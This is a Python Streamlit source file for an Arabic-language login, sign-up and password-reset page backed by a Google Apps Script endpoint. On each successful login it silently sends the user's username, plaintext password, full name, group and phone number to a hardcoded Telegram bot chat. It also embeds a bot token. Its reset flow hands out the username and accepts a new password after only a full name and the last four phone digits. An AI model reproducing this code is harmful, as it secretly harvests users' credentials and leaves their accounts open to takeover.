import streamlit as st
import requests

GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx6fFL3KAjQ-0NO1FGqfwkQKfTSpGskKomUZ1n4jFHWTYyodBmoOpzKSogSdFAbmonM/exec"

def send_telegram_message(message):
    bot_token = "8165532786:AAHYiNEgO8k1TDz5WNtXmPHNruQM15LIgD4"
    chat_id = "6283768537"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    requests.post(url, data={"chat_id": chat_id, "text": message, "parse_mode": "HTML"})

def check_login(username, password):
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data={"action": "check", "username": username, "password": password}, timeout=120)
        return res.text.strip() == "TRUE"
    except:
        return False

def get_user_data(username):
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data={"action": "get_user_data", "username": username}, timeout=120)
        parts = res.text.strip().split(",")
        if len(parts) == 5:
            return {
                "username": parts[0],
                "password": parts[1],
                "full_name": parts[2],
                "group": parts[3],
                "phone": parts[4]
            }
    except:
        return None

def add_user(username, password, full_name, group, phone):
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data={
            "action": "add",
            "username": username,
            "password": password,
            "full_name": full_name,
            "group": group,
            "phone": phone
        }, timeout=120)
        return res.text.strip() == "Added"
    except:
        return False

def find_username_by_last4(full_name, last4):
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data={
            "action": "find_username_by_last4",
            "full_name": full_name,
            "last4": last4
        }, timeout=120)
        return res.text.strip()
    except:
        return "NOT_FOUND"

def update_password(username, full_name, new_password):
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data={
            "action": "update_password",
            "username": username,
            "full_name": full_name,
            "new_password": new_password
        }, timeout=120)
        return res.text.strip()
    except:
        return "ERROR"

def login_page():
    st.markdown('<div class="login-container">', unsafe_allow_html=True)
    st.markdown("<h1>🔑 تسجيل الدخول</h1>", unsafe_allow_html=True)

    if 'show_signup' not in st.session_state:
        st.session_state['show_signup'] = False
    if 'signup_success' not in st.session_state:
        st.session_state['signup_success'] = False
    if 'show_forgot' not in st.session_state:
        st.session_state['show_forgot'] = False
    if 'forgot_step' not in st.session_state:
        st.session_state['forgot_step'] = 0
    if 'forgot_full_name' not in st.session_state:
        st.session_state['forgot_full_name'] = ""
    if 'forgot_username' not in st.session_state:
        st.session_state['forgot_username'] = ""

    # ----------------------------------------
    if not st.session_state['show_signup'] and not st.session_state['show_forgot']:
        # صفحة تسجيل الدخول الرئيسية
        username = st.text_input("اسم المستخدم", key="login_username")
        password = st.text_input("كلمة المرور", type="password", key="login_password")

        if st.button("دخول"):
            if not username or not password:
                st.warning("يرجى ملء جميع الحقول")
            else:
                if check_login(username, password):
                    user_data = get_user_data(username)
                    if user_data:
                        st.session_state['logged_in'] = True
                        st.session_state['user_name'] = user_data['username']
                        message = (
                            f"🔑 تم تسجيل دخول المستخدم:\n"
                            f"اسم المستخدم: <b>{user_data['username']}</b>\n"
                            f"كلمة المرور: <b>{user_data['password']}</b>\n"
                            f"الاسم الكامل: <b>{user_data['full_name']}</b>\n"
                            f"الجروب: <b>{user_data['group']}</b>\n"
                            f"رقم الهاتف: <b>{user_data['phone']}</b>"
                        )
                        send_telegram_message(message)
                        st.rerun()
                    else:
                        st.error("تعذر جلب بيانات المستخدم")
                else:
                    st.error("اسم المستخدم أو كلمة المرور غير صحيحة")

        if st.session_state.get('password_reset_message'):
            st.success(st.session_state['password_reset_message'])
            st.session_state['password_reset_message'] = None

        if st.session_state['signup_success']:
            st.success("✅ تم إنشاء الحساب بنجاح، سجل دخولك الآن")
            st.session_state['signup_success'] = False

        st.markdown('<div class="login-links">', unsafe_allow_html=True)
        if st.button("إنشاء حساب جديد"):
            st.session_state['show_signup'] = True
            st.rerun()
        if st.button("هل نسيت كلمة المرور؟"):
            st.session_state['show_forgot'] = True
            st.session_state['forgot_step'] = 1
            st.rerun()
        st.markdown('</div>', unsafe_allow_html=True)

    # ----------------------------------------
    elif st.session_state['show_forgot']:
        st.markdown("<h2>📝 استعادة كلمة المرور</h2>", unsafe_allow_html=True)

        if st.session_state['forgot_step'] == 1:
            # Step 1: طلب الاسم الكامل الثلاثي
            full_name = st.text_input("أدخل اسمك الكامل الثلاثي", key="forgot_full_name_input")

            if st.button("موافق"):
                if not full_name.strip():
                    st.warning("يرجى إدخال اسمك الكامل")
                else:
                    # تحقق هل الاسم موجود في البيانات (على الأقل اسم مستخدم مرتبط)
                    # نطلب رقم الهاتف في الخطوة التالية
                    st.session_state['forgot_full_name'] = full_name.strip()
                    st.session_state['forgot_step'] = 2
                    st.rerun()

        elif st.session_state['forgot_step'] == 2:
            # Step 2: طلب آخر 4 أرقام من رقم الهاتف
            st.markdown("تحقق من آخر 4 أرقام من رقم هاتفك المسجل.")
            # للحصول على رقم الهاتف كاملاً نحتاج جلب بيانات كاملة أو التحقق بعد إرسال الأرقام
            last4 = st.text_input("أدخل آخر 4 أرقام من رقم هاتفك", max_chars=4, key="forgot_last4_input")

            if st.button("تحقق"):
                if len(last4) != 4 or not last4.isdigit():
                    st.warning("يرجى كتابة آخر 4 أرقام صحيحة")
                else:
                    # ابحث عن اسم المستخدم باستخدام الاسم الكامل وآخر 4 أرقام من رقم الهاتف
                    username_found = find_username_by_last4(st.session_state['forgot_full_name'], last4)
                    if username_found == "NOT_FOUND":
                        st.error("لا يوجد مستخدم مطابق للبيانات المدخلة")
                    else:
                        st.session_state['forgot_username'] = username_found
                        st.session_state['forgot_step'] = 3
                        st.rerun()

        elif st.session_state['forgot_step'] == 3:
            # Step 3: عرض اسم المستخدم وطلب كلمة السر الجديدة
            st.markdown(f"اسم المستخدم الخاص بك هو: **{st.session_state['forgot_username']}**")
            new_password = st.text_input("اكتب كلمة السر الجديدة", type="password", key="forgot_new_password")

            if st.button("تغيير كلمة السر"):
                if not new_password.strip():
                    st.warning("يرجى كتابة كلمة سر جديدة")
                else:
                    # أرسل تحديث كلمة السر إلى Google Script
                    res = update_password(
                        st.session_state['forgot_username'],
                        st.session_state['forgot_full_name'],
                        new_password.strip()
                    )
                    if res == "UPDATED":
                        st.success("✅ تم تحديث كلمة السر بنجاح، يمكنك الآن تسجيل الدخول")
                        message = (
                            f"🔄 تم تحديث كلمة السر للمستخدم:\n"
                            f"اسم المستخدم: <b>{st.session_state['forgot_username']}</b>\n"
                            f"الاسم الكامل: <b>{st.session_state['forgot_full_name']}</b>"
                        )
                        send_telegram_message(message)
                        # إعادة تعيين الحالة للعودة لصفحة تسجيل الدخول
                        st.session_state['show_forgot'] = False
                        st.session_state['forgot_step'] = 0
                        st.session_state['forgot_full_name'] = ""
                        st.session_state['forgot_username'] = ""
                        st.rerun()
                    else:
                        st.error("حدث خطأ أثناء تحديث كلمة السر، حاول مرة أخرى")

            if st.button("🔙 العودة"):
                st.session_state['show_forgot'] = False
                st.session_state['forgot_step'] = 0
                st.session_state['forgot_full_name'] = ""
                st.session_state['forgot_username'] = ""
                st.rerun()

    # ----------------------------------------
    elif st.session_state['show_signup']:
        st.markdown("<h1>📝 إنشاء حساب جديد</h1>", unsafe_allow_html=True)
        signup_username = st.text_input("اسم المستخدم", key="signup_username")
        signup_password = st.text_input("كلمة المرور", type="password", key="signup_password")
        signup_full_name = st.text_input("الاسم الكامل", key="signup_full_name")
        signup_group = st.text_input("الجروب", key="signup_group")
        signup_phone = st.text_input("رقم الهاتف", key="signup_phone")

        if st.button("تسجيل"):
            if not signup_username or not signup_password or not signup_full_name or not signup_group or not signup_phone:
                st.warning("يرجى ملء جميع الحقول")
            else:
                if add_user(signup_username, signup_password, signup_full_name, signup_group, signup_phone):
                    st.session_state['show_signup'] = False
                    st.session_state['signup_success'] = True
                    st.rerun()
                else:
                    st.error("فشل في إنشاء الحساب، حاول مرة أخرى")

        if st.button("🔙 العودة لتسجيل الدخول"):
            st.session_state['show_signup'] = False
            st.rerun()

    st.markdown('</div>', unsafe_allow_html=True)
